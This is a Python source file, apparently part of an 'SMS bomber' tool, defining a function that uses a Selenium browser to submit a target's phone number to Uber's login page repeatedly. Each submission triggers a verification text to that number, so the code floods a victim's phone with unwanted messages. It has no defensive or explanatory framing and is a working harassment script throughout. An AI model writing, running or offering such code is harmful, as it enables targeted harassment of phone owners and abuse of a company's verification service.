import time

# Uber Bomber
def uberBomber(browser, phoneNumber, attempts=5, waitingTime=2):
    for i in range(min(attempts, 5)):
        try:
            browser.get(
                "https://auth.uber.com/login/?breeze_local_zone=dca1&next_url=https%3A%2F%2Fm.uber.com%2F%3F_ga%3D2.155960883.920544539.1585855566-19865936.1585855566&state=PJh-RvLAqzxovWA2X6tM8vE01U4ckeXaatpzNvj-lxA%3D"
            )
            # Waiting for the page to load
            time.sleep(waitingTime)

            # Selecting the input element
            inPut = browser.find_element_by_id("mobile")
            inPut.send_keys(phoneNumber)

            # Clicking the button
            cLick = browser.find_element_by_id("next-button")
            cLick.click()

        except:
            print("Something went wrong in Uber Bomber")

        finally:
            # Waiting so that one request completes
            time.sleep(waitingTime)
